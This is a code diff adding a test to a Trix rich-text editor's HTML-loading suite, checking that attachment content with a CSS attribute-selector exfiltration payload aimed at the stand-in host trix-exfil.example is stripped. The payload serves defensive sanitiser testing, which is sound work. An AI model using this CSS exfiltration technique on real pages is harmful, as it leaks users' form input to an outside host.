@@ -130,5 +130,16 @@ testGroup("HTML loading", () => {
       assert.equal(window.trixProbe, 0, "attachment content ran a handler")
       delete window.trixProbe
     })
+
+    test("drops a style element carrying an attribute-selector CSS exfiltration payload", async () => {
+      const content = "<style>input[value^=\"a\"] { background: url(https://trix-exfil.example/leak) }</style><p>attachment body</p>"
+      getEditor().loadHTML(attachmentHTML({ contentType: "text/html", content }))
+      await delay(20)
+
+      const figure = getEditorElement().querySelector("figure")
+      assert.ok(figure, "attachment was dropped")
+      assert.notOk(figure.querySelector("style"), figure.innerHTML)
+      assert.notOk(figure.innerHTML.includes("trix-exfil.example"), figure.innerHTML)
+    })
   })
 })
